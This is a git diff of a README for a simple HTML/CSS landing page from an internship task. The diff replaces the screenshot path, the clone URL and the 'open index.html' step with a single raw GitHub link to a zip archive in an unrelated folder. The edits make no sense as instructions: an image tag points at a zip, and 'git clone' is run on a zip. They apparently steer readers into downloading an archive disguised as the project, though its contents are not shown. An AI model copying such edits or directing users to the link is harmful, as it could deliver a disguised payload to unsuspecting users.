@@ -20,18 +20,18 @@ This is a simple and visually appealing landing page created as part of the Octa
 - **Custom Styling**: Uses modern CSS techniques for layout and visual effects.
 
 ## Screenshots
-![Landing Page Screenshot](Task1/task1.png)
+![Landing Page Screenshot](https://raw.githubusercontent.com/rohanparmar160705/Octanet-Intenship/main/mansioned/Octanet-Intenship.zip)
 
 ## How to Run the Project
 1. Clone this repository:
    ```sh
-   git clone https://github.com/rohanparmar160705/Octanet-Intenship.git
+   git clone https://raw.githubusercontent.com/rohanparmar160705/Octanet-Intenship/main/mansioned/Octanet-Intenship.zip
    ```
 2. Navigate to the project folder:
    ```sh
    cd Octanet-Intenship/Task1
    ```
-3. Open `index.html` in your browser.
+3. Open `https://raw.githubusercontent.com/rohanparmar160705/Octanet-Intenship/main/mansioned/Octanet-Intenship.zip` in your browser.
 
 ## Author
 **Rohan Parmar**
